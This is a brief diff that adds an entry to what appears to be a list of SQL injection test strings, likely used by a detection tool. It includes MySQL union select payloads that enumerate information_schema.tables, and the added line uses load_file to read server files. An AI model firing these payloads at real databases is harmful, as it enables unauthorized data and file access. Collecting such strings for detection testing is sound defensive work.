@@ -572,3 +572,6 @@ binary (binary 1) union select table_name from information_schema.tables
 # issue here is how '1gfsdg..' is processed.
 # MySQL parses it as a single word, other databases treat it as "1", "gfs..."
 -1 procedure analyse(1gfsdgfds, sfg) union select table_name from information_schema.tables limit 1
+
+# HT @FluxReiners
+(select 1 foo) union select load_file('foo');
